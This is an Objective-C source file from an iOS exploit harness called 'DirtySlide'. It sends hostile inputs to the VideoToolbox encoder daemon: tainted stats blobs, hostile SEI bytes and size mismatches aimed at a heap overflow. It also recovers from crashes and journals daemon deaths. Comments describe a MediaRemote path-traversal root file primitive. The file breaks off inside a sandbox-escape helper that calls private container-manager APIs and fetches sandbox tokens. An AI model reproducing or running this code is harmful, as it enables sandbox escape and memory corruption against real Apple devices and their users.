//  ds_core.m - DirtySlide SHARED HARNESS (v136 split from the 5,207-line ViewController.m)
//  Everything a probe row needs: encoder/decode callbacks + byte-hash oracle,
//  guard recovery (SIGSEGV/BUS/ILL/TRAP/ABRT -> siglongjmp), watchdog, run
//  journal, daemon-epoch counter, the 1x1 replay beat, session teardown,
//  footprint/alive phases, and the bad_query class-13 SANDBOX ESCAPE helpers.
//  Shared contract: ds_core.h. The probe rows live in the probe_*.m files.
#include "ds_core.h"

#import <UIKit/UIKit.h>
#import <ImageIO/ImageIO.h>
#import <CoreGraphics/CoreGraphics.h>
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreVideo/CVPixelBufferIOSurface.h>
#import <IOSurface/IOSurfaceRef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <signal.h>
#include <setjmp.h>
#include <time.h>
#include <objc/runtime.h>
#include <objc/message.h>
#include <spawn.h>
/* ---- VTMultiPassStorage private API (in .tbd, not in public header) ---- */
extern OSStatus VTMultiPassStorageSetDataAtTimeStamp(
    VTMultiPassStorageRef storage,
    const CMTime *pts,
    CFDataRef data,
    CFErrorRef *errorOut) API_AVAILABLE(macos(10.10), ios(8.0), tvos(10.2), visionos(1.0));

#include <pthread.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <mach-o/dyld.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <dirent.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_time.h>
#include <dispatch/dispatch.h>
#include <xpc/xpc.h>
#include <dirent.h>

/* ---- encoder-callback globals (shared by the audit + beats) ------------ */

volatile sig_atomic_t  g_ave_cb_fires; /* encoder-output callbacks (any status) */
volatile sig_atomic_t  g_ave_cb_ok;    /* callbacks with st==0 (real sample out) */
volatile sig_atomic_t  g_ave_cb_err;   /* last non-zero OSStatus seen by the cb */
volatile uint64_t  g_ave_cb_fire_mach; /* mach_absolute_time of the first cb fire */
volatile uint64_t  g_ave_cb_bytes;     /* compressed output bytes seen by the cb */
volatile uint64_t  g_ave_cb_hash;      /* v124: FNV-1a-64 over every ok sample's bytes, XOR-accumulated - the byte-level C0-vs-X oracle */
volatile int  g_ave_mk_on = 0;         /* v153: the 4-byte marker scan enable */
volatile uint8_t  g_ave_mk[4];         /* v153: the marker pattern */
volatile int  g_ave_mk_hits = 0;       /* v153: marker hits in this cell's samples */
volatile uint64_t  g_ave_cb_tlast = 0; /* v155: mach time of the last ok cb (timing oracle) */
volatile int  g_ave_cb_ivn = 0;        /* v155: interval samples this cell */
volatile uint64_t  g_ave_cb_ivsum = 0; /* v155: sum of inter-ok-cb intervals (us) */
volatile uint64_t  g_ave_cb_ivmax = 0; /* v155: max inter-ok-cb interval (us) */
volatile int  g_ave_fp_on;             /* v49: fingerprint the LAST ok output sample (1 = capture) */
volatile int  g_ave_fp_len;
volatile uint8_t  g_ave_fp[12];        /* first 12 bytes of the last ok sample (avcC: [len:4][NAL hdr:1]...) */
volatile int  g_ave_cap_on;            /* v77: 1 = ave_out_cb retains the FULL first ok sample for the SEI-REFEED */
CMSampleBufferRef  g_ave_cap_sb;       /* v77: the retained output sample (released in the SELF-DECODE tail) */


void  ds_fp_hex(char *out, size_t n) {
    /* format the captured fp (first bytes of the last ok sample) as hex for receipts */
    int l = g_ave_fp_len;
    if (l <= 0) { snprintf(out, n, "-"); return; }
    size_t need = (size_t)l * 2 + 1;
    if (need > n) l = (int)((n - 1) / 2);
    for (int i = 0; i < l; i++) snprintf(out + (size_t)i * 2, n - (size_t)i * 2, "%02x", (unsigned)g_ave_fp[i]);
}

void ave_out_cb(void *refcon, void *sfr, OSStatus st, VTEncodeInfoFlags fl, CMSampleBufferRef sb)
{
    (void)refcon; (void)sfr; (void)fl;
    /* v126-r: the 43805 race workers call this cb from TWO threads concurrently -
     * the plain ++ on volatile sig_atomic_t lost updates; GCC builtins keep the
     * cb_total receipt exact (the guard path stays single-threaded). */
    __sync_fetch_and_add(&g_ave_cb_fires, 1);
    if (st == 0 && sb) {
        __sync_fetch_and_add(&g_ave_cb_ok, 1);
        CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sb);
        if (bb) __sync_fetch_and_add(&g_ave_cb_bytes, (uint64_t)CMBlockBufferGetDataLength(bb));
        /* v124: byte-hash oracle - FNV-1a 64 over this sample's bytes, XOR-accumulated
         * across the cell's frames. Within a run the encoder is deterministic, so
         * H == C0H (byte-for-byte) proves the option did not touch the stream at all;
         * H != C0H with B == C0B = the option perturbed bytes at constant size. */
        if (bb) {
            /* v124-r: hash the FULL sample - GetDataPointer returns only the FIRST
             * contiguous segment; if it doesn't cover GetDataLength (non-contiguous
             * block buffer), fall back to CopyDataBytes so H is ALWAYS over every
             * byte the B-sum counts. */
            size_t total = (size_t)CMBlockBufferGetDataLength(bb);
            size_t blen2 = 0; char *bp2 = NULL;
            uint64_t h = 0xcbf29ce484222325ULL;
            if (total > 0 &&
                CMBlockBufferGetDataPointer(bb, 0, NULL, &blen2, &bp2) == kCMBlockBufferNoErr &&
                bp2 && blen2 == total) {
                for (size_t i = 0; i < blen2; i++) { h ^= (uint8_t)bp2[i]; h *= 0x100000001b3ULL; }
            } else if (total > 0) {
                void *tmp = malloc(total);
                if (tmp) {
                    if (CMBlockBufferCopyDataBytes(bb, 0, total, tmp) == kCMBlockBufferNoErr) {
                        for (size_t i = 0; i < total; i++) { h ^= ((uint8_t *)tmp)[i]; h *= 0x100000001b3ULL; }
                    }
                    free(tmp);
                }
            }
            __sync_fetch_and_xor(&g_ave_cb_hash, h);
            /* v155: the TIMING oracle - inter-ok-callback intervals for this cell.
             * A semantic taint that changes RC work shows up as a latency shift
             * even when the byte size stays identical (the display_order pop-order
             * lever is a scheduling control - this is its meter). */
            uint64_t now = mach_absolute_time();
            uint64_t last = g_ave_cb_tlast;
            if (last != 0 && now > last) {
                static mach_timebase_info_data_t tb;
                if (tb.denom == 0) mach_timebase_info(&tb);
                uint64_t us = (now - last) * tb.numer / tb.denom / 1000ULL;
                if (us > 0 && us < 60000000ULL) {   /* sanity: <60s */
                    __sync_fetch_and_add(&g_ave_cb_ivsum, us);
                    if (us > g_ave_cb_ivmax) g_ave_cb_ivmax = us;
                    __sync_fetch_and_add(&g_ave_cb_ivn, 1);
                }
            }
            g_ave_cb_tlast = now;
            /* v153: the MARKER SCAN - a 4-byte taint pattern searched over every
             * ok sample. Set g_ave_mk before the cell; mkHits>0 = the tainted
             * stats bytes REACHED THE ENCODED OUTPUT. */
            if (g_ave_mk_on && total >= 4) {
                for (size_t i = 0; i + 4 <= total; i++) {
                    if (bp2[i] == g_ave_mk[0] && bp2[i+1] == g_ave_mk[1] &&
                        bp2[i+2] == g_ave_mk[2] && bp2[i+3] == g_ave_mk[3]) {
                        __sync_fetch_and_add(&g_ave_mk_hits, 1);
                        i += 3;
                    }
                }
            }
        }
        if (g_ave_fp_on && bb) {
        /* v49 delivery oracle: capture an ok sample's first NAL bytes (overwritten on
         * each ok sample - for single-frame cells this is THE frame, for multi-frame
         * cells it is whichever completed before the receipt's wait-loop break). In
         * avcC mode byte[4]&0x1F = the NAL type, byte[5] = nal_ref_idc/temporal_id -
         * a NaluType/TemporalID/ResetRC option that CHANGED the encoded stream shows
         * up here; a byte-identical fp across cells = the option was stripped/ignored. */
            char *bp = NULL;
            size_t blen = 0;
            if (CMBlockBufferGetDataPointer(bb, 0, NULL, &blen, &bp) == kCMBlockBufferNoErr && bp && blen > 0) {
                int n = blen < sizeof(g_ave_fp) ? (int)blen : (int)sizeof(g_ave_fp);
                for (int i = 0; i < n; i++) g_ave_fp[i] = (uint8_t)bp[i];
                g_ave_fp_len = n;
            }
        }
        if (g_ave_cap_on && !g_ave_cap_sb) {
            /* v77: SEI-REFEED - retain the FULL first ok output sample. The v76 run
             * PROVED our hostile SEI bytes ride the actual encoded bitstream (the fp
             * 5a5a5a5a on OP03/OP11) - the SELF-DECODE tail feeds this sample back
             * into a VTDecompressionSession = the daemon's decoder parses it. */
            CFRetain(sb);
            g_ave_cap_sb = sb;
        }
    } else if (st != 0) {
        g_ave_cb_err = (int)st;
    }
    if (g_ave_cb_fire_mach == 0) g_ave_cb_fire_mach = mach_absolute_time();
}

/* ---- DC row: decompression callback (fires/ok/err + output dims) --------- */
volatile sig_atomic_t  g_dec_cb_fires, g_dec_cb_ok, g_dec_cb_err;
volatile int64_t  g_dec_out_w, g_dec_out_h;

void dec_out_cb(void *refcon, void *sfr, OSStatus st, VTDecodeInfoFlags fl, CVImageBufferRef ib,
           CMTime pts, CMTime dur)
{
    (void)refcon; (void)sfr; (void)fl; (void)pts; (void)dur;
    g_dec_cb_fires++;
    if (st == 0 && ib) {
        g_dec_cb_ok++;
        g_dec_out_w = CVPixelBufferGetWidth(ib);
        g_dec_out_h = CVPixelBufferGetHeight(ib);
    } else if (st != 0) {
        g_dec_cb_err = (int)st;
    }
}

/* ---- guard recovery (SIGSEGV/BUS/ILL/TRAP/ABRT -> siglongjmp, app never dies) */

static sigjmp_buf g_ave_jmp;
static volatile sig_atomic_t g_ave_fault_sig;
uintptr_t  g_ave_fault_addr;
/* v107: WATCHDOG state - declared BEFORE the handler so it can swallow stale
 * SIGALRMs. Armed only inside ds_ave_guard_run_impl when tmoMs > 0. */
static volatile sig_atomic_t g_ave_wd_armed = 0;
static volatile sig_atomic_t g_ave_wd_epoch = 0;
/* v109: only the PROBE thread (the one inside a guard) may siglongjmp. A fault on
 * any OTHER thread - the 09:44 death was Thread 5, an unnamed CoreMedia/FigRPC
 * worker with EMPTY frames, pc = an ODD address INSIDE ITS OWN STACK (EXC_ARM_DA_
 * ALIGN, wiped fp/lr = smashed-frame return-through-garbage) - must NOT longjmp to
 * the probe's jmp_buf: cross-thread longjmp is UB and corrupts the crash into a
 * stack-garbage jump. Re-raise with the default action instead: the process dies
 * with a CLEAN .ips, and the journal (which already named the shot) is the
 * attribution. */
static pthread_t g_ave_guard_tid;
static volatile sig_atomic_t g_ave_in_guard = 0;

static void
ds_ave_fault_handler(int sig, siginfo_t *si, void *ctx)
{
    (void)ctx;
    /* v107: the SIGALRM watchdog handler stays installed for the harness lifetime
     * (ds_ave_guard_run_impl never restores it - see the restore loop). A SIGALRM
     * that lands when NO watchdog is armed is a stale/racing dispatch (the TOCTOU:
     * a dispatch that passed the flag check can kill AFTER the guard restored the
     * default disposition - SIGALRM default = process death). SWALLOW it instead. */
    if (sig == SIGALRM && !g_ave_wd_armed) return;
    if (!g_ave_in_guard || !pthread_equal(pthread_self(), g_ave_guard_tid)) {
        /* v109-r: foreign-thread or out-of-guard fault. Witness it with an
         * ASYNC-SIGNAL-SAFE write (manual decimal itoa into a stack buffer) -
         * dprintf here is NOT safe: the 09:44 death had Thread 2 mid-dprintf
         * holding the stdio lock when Thread 5 faulted, so a handler dprintf
         * could deadlock on that same lock. Then re-raise with the default
         * disposition so the .ips is CLEAN (not the UB cross-thread longjmp
         * stack-garbage jump of 09:44). The journal START-w/o-DONE names the
         * shot; the .ips gives the full thread/addr. */
        char wbuf[96];
        size_t wn = 0;
        static const char pre[] = "FOREIGN FAULT sig=";
        for (size_t i = 0; i < sizeof(pre) - 1 && wn < sizeof(wbuf) - 1; i++) wbuf[wn++] = pre[i];
        unsigned v = (unsigned)sig;
        char tmp[12];
        size_t tl = 0;
        do { tmp[tl++] = (char)('0' + (v % 10)); v /= 10; } while (v && tl < sizeof(tmp));
        while (tl > 0 && wn < sizeof(wbuf) - 1) wbuf[wn++] = tmp[--tl];
        static const char suf[] = " outside a guard - re-raising (journal names the shot; .ips stays clean)\n";
        for (size_t i = 0; i < sizeof(suf) - 1 && wn < sizeof(wbuf) - 1; i++) wbuf[wn++] = suf[i];
        (void)write(STDOUT_FILENO, wbuf, wn);
        struct sigaction def;
        memset(&def, 0, sizeof(def));
        def.sa_handler = SIG_DFL;
        sigemptyset(&def.sa_mask);
        sigaction(sig, &def, NULL);
        raise(sig);
        _exit(128 + sig);
    }
    g_ave_fault_sig = sig;
    g_ave_fault_addr = (uintptr_t)(si ? si->si_addr : 0);
    siglongjmp(g_ave_jmp, 1);
}

/* Runs the block under guard recovery. Returns 0 if it completed (block result
 * stored in *rcOut), the caught signal number if it faulted, or -1 if the guard
 * could not be armed. Restores all handlers afterwards. */
/* v107: WATCHDOG guard core. tmoMs > 0 = a delayed pthread_kill(SIGALRM) to the
 * running thread converts a HANG (the 00:19 session-create blocked in mach_msg -
 * no signal = never caught, then the death-callback pc=0 SIGKILL) into a caught
 * fault (sig 14). The epoch guard makes stale pending dispatches no-ops across
 * rapid re-arms. The SIGALRM handler stays installed for the harness lifetime
 * (never restored) - the handler swallows stray SIGALRMs when unarmed. */
void  ds_ave_wd_arm(long tmoMs)
{
    pthread_t self = pthread_self();
    int ep = ++g_ave_wd_epoch;
    g_ave_wd_armed = 1;
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)tmoMs * (int64_t)NSEC_PER_MSEC),
                   dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        if (g_ave_wd_armed && ep == g_ave_wd_epoch)
            pthread_kill(self, SIGALRM);
    });
}

void  ds_ave_wd_disarm(void)
{
    g_ave_wd_armed = 0;
    g_ave_wd_epoch++;   /* invalidate any stale pending dispatch */
}

static int
ds_ave_guard_run_impl(int (^blk)(void), int *rcOut, long tmoMs)
{
    struct sigaction sa, oldA[6];
    const int sigs[6] = { SIGBUS, SIGSEGV, SIGILL, SIGTRAP, SIGABRT, SIGALRM };
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = ds_ave_fault_handler;
    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    sigemptyset(&sa.sa_mask);
    for (int i = 0; i < 6; i++) {
        if (sigaction(sigs[i], &sa, &oldA[i]) != 0) {
            for (int j = i - 1; j >= 0; j--) sigaction(sigs[j], &oldA[j], NULL);
            return -1;
        }
    }
    int rc = -999, sig = 0;
    if (sigsetjmp(g_ave_jmp, 1) == 0) {
        /* v109: the flag is set ONLY after sigsetjmp returned (the jmp_buf is now
         * valid) so a fault in the few instructions before it re-raises instead of
         * longjmping to an unset buffer. */
        g_ave_guard_tid = pthread_self();
        g_ave_in_guard = 1;
        if (tmoMs > 0) ds_ave_wd_arm(tmoMs);
        rc = blk();
        if (tmoMs > 0) ds_ave_wd_disarm();
        g_ave_in_guard = 0;
    } else {
        sig = (int)g_ave_fault_sig;
        if (tmoMs > 0) ds_ave_wd_disarm();
        g_ave_in_guard = 0;
    }
    for (int i = 0; i < 5; i++) sigaction(sigs[i], &oldA[i], NULL);   /* v107: SIGALRM (i=5) stays installed - the handler swallows stray ones */
    if (rcOut) *rcOut = rc;
    return sig;
}

/* v107: the original no-timeout guard (behavior unchanged for the rest of the harness). */
int ds_ave_guard_run(int (^blk)(void), int *rcOut)
{
    return ds_ave_guard_run_impl(blk, rcOut, 0);
}

/* v107: guard + watchdog - any block running > tmoMs is interrupted with SIGALRM
 * (returned as sig 14) instead of hanging the probe thread forever. */
int ds_ave_guard_run_tmo(int (^blk)(void), int *rcOut, long tmoMs)
{
    return ds_ave_guard_run_impl(blk, rcOut, tmoMs);
}

void ds_ave_stamp(char *buf, size_t n)
{
    struct timeval tv;
    struct tm tm;
    gettimeofday(&tv, NULL);
    localtime_r(&tv.tv_sec, &tm);
    snprintf(buf, n, "%02d:%02d:%02d.%03d",
             tm.tm_hour, tm.tm_min, tm.tm_sec, (int)(tv.tv_usec / 1000));
}

/* ---- v57: the run journal (client-side death attribution) -------------- */
/* The 19:03:44 client crash (v56 OP02 ReferenceL0=INTMAX - a 2.1-billion-item
 * CFArray OOM suicide) produced ZERO evidence: ReportCrashService is sandbox-
 * denied on the LiveContainer-hosted binary, so no .ips and no console line.
 * The journal persists a START/DONE line per row-op to the sandbox Documents
 * dir; on the next launch runProbe reads it back and names the cell that was
 * running when a CLIENT death (OOM/SIGKILL/segfault) landed - a daemon death
 * lets the cell complete and journal DONE, so those stay log-correlation.
 * The unified log is the daemon witness; the journal is the client witness -
 * PULL BOTH. */
static char g_journal_path[1024];
static int  g_journal_inited = 0;

void  ds_journal_init(void)
{
    if (g_journal_inited) return;
    g_journal_inited = 1;
    const char *home = getenv("HOME");
    if (!home || !*home) return;
    /* iOS always creates the app container's Documents dir at launch (sandbox);
     * the open(O_CREAT) in ds_journal_write fails cleanly if it is absent. */
    snprintf(g_journal_path, sizeof(g_journal_path), "%s/Documents/ds_journal.log", home);
}

void  ds_journal_write(const char *ev, const char *tag)
{
    ds_journal_init();
    if (!g_journal_path[0]) return;
    int fd = open(g_journal_path, O_WRONLY | O_APPEND | O_CREAT, 0600);
    if (fd < 0) return;
    char st0[32];
    ds_ave_stamp(st0, sizeof(st0));
    dprintf(fd, "[%s] %s %s\n", st0, ev, tag);
    close(fd);
}

/* ---- v175: the UI FLAGS FIELD (injected run args) ---- */
static char  g_ds_flagBuf[512];
static char *g_ds_flagTok[32];
static int   g_ds_flagTokN;

void ds_flags_set(const char *text)
{
    g_ds_flagTokN = 0;
    if (!text || !text[0]) return;
    strncpy(g_ds_flagBuf, text, sizeof(g_ds_flagBuf) - 1);
    g_ds_flagBuf[sizeof(g_ds_flagBuf) - 1] = 0;
    char *save = NULL;
    for (char *t = strtok_r(g_ds_flagBuf, " \t", &save);
         t && g_ds_flagTokN < 32; t = strtok_r(NULL, " \t", &save))
        g_ds_flagTok[g_ds_flagTokN++] = t;
}

int ds_flags_present(const char *name)
{
    for (int i = 0; i < g_ds_flagTokN; i++)
        if (strcmp(g_ds_flagTok[i], name) == 0) return 1;
    return 0;
}

const char *ds_flags_value(const char *name)
{
    static char out[128];
    for (int i = 0; i + 1 < g_ds_flagTokN; i++) {
        if (strcmp(g_ds_flagTok[i], name) == 0) {
            strncpy(out, g_ds_flagTok[i + 1], sizeof(out) - 1);
            out[sizeof(out) - 1] = 0;
            return out;
        }
    }
    return NULL;
}

/* read the tail; if the LAST START has no DONE after it, the cell died mid-run */int  ds_journal_readback(char *out, size_t n)
{
    ds_journal_init();
    out[0] = 0;
    if (!g_journal_path[0]) return 0;
    int fd = open(g_journal_path, O_RDONLY);
    if (fd < 0) return 0;
    char buf[8192];
    /* read the TAIL, not the head - the journal grows ~1.8KB per run and the
     * newest START/DONE lines are the only ones that matter. */
    off_t fsz = lseek(fd, 0, SEEK_END);
    ssize_t r = 0;
    if (fsz > 0) {
        size_t want = (fsz > (off_t)(sizeof(buf) - 1)) ? sizeof(buf) - 1 : (size_t)fsz;
        lseek(fd, fsz - (off_t)want, SEEK_SET);
        r = read(fd, buf, want);
    }
    close(fd);
    if (r <= 0) return 0;
    buf[r] = 0;
    const char *lastStart = NULL, *lastDone = NULL;
    char *save = NULL;
    for (char *ln = strtok_r(buf, "\n", &save); ln; ln = strtok_r(NULL, "\n", &save)) {
        if (strstr(ln, " START ")) lastStart = ln;
        if (strstr(ln, " DONE "))  lastDone = ln;
    }
    if (!lastStart) return 0;
    if (lastDone && lastDone > lastStart) return 0;    /* run completed cleanly */
    snprintf(out, n, "[+] JOURNAL: the LAST row-op died mid-cell: %s\n[+]   (no DONE after its START - a CLIENT death: OOM/SIGKILL/segfault; correlate with the log window)\n",
             strstr(lastStart, " START ") + 7);
    return 1;
}

double ds_ave_elapsed_ms(uint64_t t0)
{
    static mach_timebase_info_data_t tb;
    static int inited = 0;
    if (!inited) { mach_timebase_info(&tb); inited = 1; }
    return (double)(mach_absolute_time() - t0) * tb.numer / tb.denom / 1000000.0;
}

/* ---- v33 daemon-epoch op counter (G8) ---------------------------------- */
/* The daemon accumulates per-session/encode state since its last restart; past
 * ~20-25 ops each op costs 20s * 2^(n-threshold) (exact doubling observed on the
 * v31 AL + AN runs). REBOOT the device to reset. The counter is app-lifetime -
 * after a mid-run daemon crash, relaunch the app to reset it (safe side). */
/* 24 = both families' combined encode ops in one daemon epoch: audit family
 * 9 gate cells + 1 B-trigger + 4 GCH beats = 14, mediaremoted 4 MRH beats = 4
 * (MR01-04 send commands, no encode ops). Both fit before EPOCH-EXHAUSTED. */
int  g_ds_epoch_ops = 0;
void  ds_epoch_bump(const char *pfx, const char *tag)
{
    (void)pfx; (void)tag;
    g_ds_epoch_ops++;   /* v142: silent - the cap fires via ds_epoch_exhausted only */
}
int  ds_epoch_exhausted(const char *pfx)
{
    if (g_ds_epoch_ops >= DS_EPOCH_CAP) {
        dprintf(STDOUT_FILENO, "%s  EPOCH-EXHAUSTED cum=%d/%d - REBOOT the device, then run this row ALONE.\n",
                pfx, g_ds_epoch_ops, DS_EPOCH_CAP);
        return 1;
    }
    return 0;
}

/* ---- 1x1 replay beat (daemon-alive proof; used by both rows) ----------- */

void ds_ave_replay(const char *pfx, const char *tag, int sessW, int sessH, int inSize,
              FourCharCode codec, OSType inFmt, int frames, int doComplete)
{
    char st0[32];
    if (ds_epoch_exhausted(pfx)) return;
    ds_epoch_bump(pfx, tag);
    ds_ave_stamp(st0, sizeof(st0));
    dprintf(STDOUT_FILENO, "%s [%s] I[%s] beat sess %dx%d x%d (cum=%d)\n",
            pfx, st0, tag, sessW, sessH, frames, g_ds_epoch_ops);
    __block VTCompressionSessionRef sess = NULL;
    int csSig = 0, csSt = -999;
    csSig = ds_ave_guard_run(^int {
        OSStatus s = VTCompressionSessionCreate(NULL, sessW, sessH, codec,
                                                NULL, NULL, NULL, ave_out_cb, NULL, &sess);
        return (int)s;
    }, &csSt);
    if (csSig) {
        dprintf(STDOUT_FILENO, "%s  I[%s] create FAULTED sig=%d @0x%lx\n",
                pfx, tag, csSig, (unsigned long)g_ave_fault_addr);
        return;
    }
    if (csSt != 0 || !sess) {
        dprintf(STDOUT_FILENO, "%s  I[%s] create=%d\n", pfx, tag, csSt);
        return;
    }
    size_t bpr = (inFmt == kCVPixelFormatType_32BGRA) ? (size_t)inSize * 4 : (size_t)inSize;
    size_t len = bpr * (size_t)inSize;
    uint8_t *backing = malloc(len);
    if (!backing) { VTCompressionSessionInvalidate(sess); CFRelease(sess); return; }
    memset(backing, 0x41, len);
    CVPixelBufferRef pb = NULL;
    CVReturn cr = CVPixelBufferCreateWithBytes(NULL, inSize, inSize, inFmt,
                                               backing, bpr, NULL, NULL, NULL, &pb);
    if (cr != 0 || !pb) { free(backing); VTCompressionSessionInvalidate(sess); CFRelease(sess); return; }
    int base = g_ave_cb_fires, baseOk = g_ave_cb_ok;
    g_ave_cb_err = 0; g_ave_cb_fire_mach = 0; g_ave_cb_bytes = 0;
    g_ave_fp_on = 1; g_ave_fp_len = 0;   /* v49: capture the output fingerprint for this cell */
    int es = -999;
    int fr = ds_ave_guard_run(^int {
        OSStatus a = VTCompressionSessionPrepareToEncodeFrames(sess);
        if (a != 0) return (int)a;
        OSStatus b = 0;
        for (int f = 0; f < frames; f++)
            b = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(f, 600), CMTimeMake(1, 600), NULL, NULL, NULL);
        return (int)b;
    }, &es);
    int flushed = 0, drainFr = 0;
    if (fr == 0 && doComplete) {
        int es2 = -999;
        drainFr = ds_ave_guard_run(^int { return (int)VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid); }, &es2);
        flushed = 1;
    }
    int fires = 0, okf = 0;
    for (int i = 0; i < 150; i++) {
        usleep(200000);
        fires = g_ave_cb_fires - base;
        okf = g_ave_cb_ok - baseOk;
        if (fires > 0) break;
    }
    if (fr > 0 || drainFr > 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] FAULTED in-process @0x%llx (sig %d)\n", pfx, tag,
                (unsigned long long)g_ave_fault_addr, fr > 0 ? fr : drainFr);
    } else {
        ds_ave_stamp(st0, sizeof(st0));
        dprintf(STDOUT_FILENO, "%s  I[%s] es=%d cb+%lu ok+%lu err=%d => %s\n",
                pfx, tag, es, fires, okf, (int)g_ave_cb_err,
                fires > 0 ? "DAEMON ALIVE" : "NO-CB (daemon dead/gated)");
    }
    if (pb) CVBufferRelease(pb);
    free(backing);
    if (sess) { VTCompressionSessionInvalidate(sess); CFRelease(sess); }
    usleep(300000);
}

/* ========================================================================
 * ROW 1 - mediaremoted 43723 (CVE-2026-43723 classification)
 * ========================================================================
 * MediaRemote path-handling EoP (Nosebeard Labs - Richard Zana, Andreas
 * Jaegersberger, Ro Achterberg; fixed iOS/iPadOS 26.6, advisory HT128066):
 * MRMediaRemoteSendCommand with directory-traversal identifiers inside the
 * playback-session-data payload (../../../../../../private/tmp/... shape) =
 * a root file create/delete primitive (the file is cleaned ~50ms later).
 * iOS 27.0 = patched EXPECTED - this row classifies whether the sandboxed app
 * still reaches the MediaRemote command surface and what the traversal shape
 * does. MediaRemote is a PRIVATE framework (no SDK headers): everything is
 * dlopen'd + dlsym'd and every call runs under guard recovery.
 * MAY CRASH DAEMON (mediaremoted).
 */

void  ds_opt_teardown(const char *pfx, const char *tag, VTCompressionSessionRef s) {
    if (!s) return;
    if (g_opt_conn_poisoned) {
        dprintf(STDOUT_FILENO, "%s  I[%s] TEARDOWN-SKIPPED (v107 conn-poisoned - session LEAKED, no Invalidate = no SIGKILL wild-jump)\n", pfx, tag);
        return;
    }
    int ts = 0, te = -999;
    ts = ds_ave_guard_run_tmo(^int { VTCompressionSessionInvalidate(s); CFRelease(s); return 0; }, &te, 8000);   /* v107: watchdog - a hanging Invalidate becomes a caught fault */
    if (ts > 0) {
        g_opt_conn_poisoned = 1;   /* a teardown fault = the connection is suspect - stop touching VT */
        dprintf(STDOUT_FILENO, "%s  I[%s] teardown FAULTED sig=%d @0x%lx (v107: conn poisoned - further VT ops skipped)\n", pfx, tag, ts, (unsigned long)g_ave_fault_addr);
    }
}

/* v111: OPC3 - MULTIPASS-STATS frameNumber (blob+0x2c) SWEEP. Static analysis of
 * ave.videoencoder AVE_H264MultipassDataFetch: after the 1574-byte CFData fetch
 * (frameNumber-1), the daemon gate compares blob[0x2c] (S_AVE_MultiPassStats
 * frameNumber field - the exact byte swept as 0x7a/0x41 in v108-v110) against the
 * session's expected frameNumber; mismatch = stats REJECTED (client EndPass
 * errors = rej@E). A matching value flips the shot to RODE = our 1574 bytes are
 * ACCEPTED as trusted stats - then every field in them is trusted (QP/RC sizes). */
/* v115: OPC4 - USERQPMAP EXACT-GATE + CB-VERDICT + DIMS-MISMATCH (CVE-2026-64747).
 * Binary read of driver+binaries/VideoCodecs/ave.videoencoder (arm64e, 24A5355q):
 *   PrepareMBInputCtrl (0x2b9558870):
 *     gate: frameInfo->userQpMapSize@0x1298 == w2 (the REQUIRED size); mismatch ->
 *       log "UserQpMapSize (%d) does not match required size (%d), disabling userQPMap
 *       feature" -> return -1001 (the FRAME FAILS - visible via the output callback).
 *     pass: memcpy(AVE_USurface::GetAddr(0) on drv->USurface@0x98, our bytes
 *       @frameInfo+0x1290, w2) - NO destination-capacity check.
 *   REQUIRED = AVE_CalcBufSizeOfMBInputCtrl(drv->devType@0x1c, drv->encType@0x150,
 *     drv->w@0x134, drv->h@0x138) (0x2b9520a9c): AVC (encType==1) devType<29 ->
 *     w16*((h+15)>>4); devType>=29 -> ((w16+63)&~63)*(((h+63)>>4)&~3). @1080p BOTH
 *     branches = 130560 (the v111 formula was right there); @4K the NEW branch =
 *     522240 vs the old 518400 - the 11:58 sweep MISSED the real 4K req (518400/
 *     129600/518399/518401/1036800/259200 all mismatch - the gate never passed @4K).
 *   The destination USurface is allocated at SESSION-CREATE dims (settings+0x3c/0x40)
 *   with the SAME formula; drv+0x134/0x138 are NEVER written in this plugin - set by
 *   the marshaler or the create copy. IF the gate dims track the FRAME pixel buffer,
 *   a session-small/frame-big shot = memcpy formula(frame) bytes into a surface sized
 *   formula(session) = OVERFLOW (the M1/M2 attempt). Verdicts are now CALLBACK-BASED
 *   (drain + g_ave_cb_* deltas): ACCEPT = output produced (gate passed + the memcpy
 *   ran, or the map dropped silently); DROP = callback error (the -1001 gate reject);
 *   NO-CB = no callbacks at all (transport dead). C1 (1B map) is the transport oracle.
 * v115 CUT the dead cells: OPC3 (multipass stats - fn000-007 all rejE on 11:40/11:58),
 * OPC1b x96 (rode 96 CLEAN on 11:58 - the 39-55 count-death window theory is DEAD),
 * OPC2/OPD0/OPC0/OPA0-3/OPB0 (the multipass-storage route: the 09:45 SIGBUS DA_ALIGN
 * corrupted OUR client on a FigRPC thread, every stats byte rejects since, no daemon
 * .ips ever). The row is now: control + OP99 baseline + THIS. */
int64_t  ds_esc_try(const char *path, uint64_t cls, const char *grp, uint64_t part, uint64_t flags)
{
    /* v159: the PARAMETERIZED bad_query port - class/group/part/flags are
     * caller-chosen so the row can SWEEP recipes against this boot instead of
     * assuming the 24A5355q-proven constants. grp == NULL skips set_group. */
    if (!path || path[0] != '/') return -255;
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;
    void *(*q_create)(void) = dlsym(mgr, "container_query_create");
    void (*q_set_class)(void *, uint64_t) = dlsym(mgr, "container_query_set_class");
    void (*q_set_group)(void *, xpc_object_t) = dlsym(mgr, "container_query_set_group_identifiers");
    void (*q_set_flags)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_flags");
    void (*q_set_part)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_part");
    void (*q_set_dom)(void *, const char *) = dlsym(mgr, "container_query_operation_set_part_domain");
    void *(*q_result)(void *) = dlsym(mgr, "container_query_get_single_result");
    void (*q_free)(void *) = dlsym(mgr, "container_query_free");
    char *(*copy_tok)(void *) = dlsym(mgr, "container_copy_sandbox_token");
